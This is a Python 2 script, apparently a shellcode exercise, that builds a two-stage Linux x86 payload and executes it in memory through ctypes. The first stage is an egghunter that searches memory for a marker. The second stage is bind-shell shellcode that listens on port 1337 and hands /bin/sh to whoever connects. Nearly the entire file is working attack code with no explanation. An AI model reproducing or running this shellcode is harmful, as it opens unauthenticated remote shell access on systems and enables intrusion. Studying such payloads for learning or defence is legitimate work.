#@bugsam
#12/07/2020
#!/usr/bin/env python2
import ctypes

egg = "\x99\x90\x99\x90"

first_stage =  ""
first_stage += "\x29\xd2\x29\xc9\xbb"
first_stage += egg
first_stage += "\x29\xc0\x66\x81"
first_stage += "\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c"
first_stage += "\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9"
first_stage += "\xff\xe2"
second_stage = ""
second_stage += "\x31\xff\x31\xd2\x31\xdb\x31\xc0\x52\x6a\x01\x6a\x02"
second_stage += "\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x31\xd2\x52\x66\xba"
second_stage += "\x05\x39\xc1\xe2\x10\xb2\x02\x52\x89\xe1\x6a\x10\x51"
second_stage += "\x50\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x5a\x57\x52\x89"
second_stage += "\xe1\xb3\x04\xb0\x66\xcd\x80\x57\x57\x89\xe1\x57\x57"
second_stage += "\x52\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x31\xc9\xb1\x02"
second_stage += "\x89\xc3\x51\x31\xc0\xb0\x3f\xcd\x80\x59\x49\x7d\xf5"
second_stage += "\xeb\x1c\x5e\x31\xdb\x8d\x4e\x0d\x89\x0e\x89\x5e\x04"
second_stage += "\x88\x5e\x0f\x8d\x56\x04\x8d\x0e\x8d\x5e\x08\x31\xc0"
second_stage += "\xb0\x0b\xcd\x80\xe8\xdf\xff\xff\xff\x5a\x5a\x5a\x5a"
second_stage += "\x4e\x4e\x4e\x4e\x2f\x62\x69\x6e\x2f\x73\x68\x4e"

payload = ""
payload += first_stage
payload += egg
payload += egg
payload += second_stage

#FIXME
buf = ctypes.create_string_buffer(payload, len(payload)) # creates a buffer in memory
shellcode = ctypes.cast(buf, ctypes.CFUNCTYPE(ctypes.c_void_p)) # creates a function pointer to shellcode
shellcode() #call shellcode
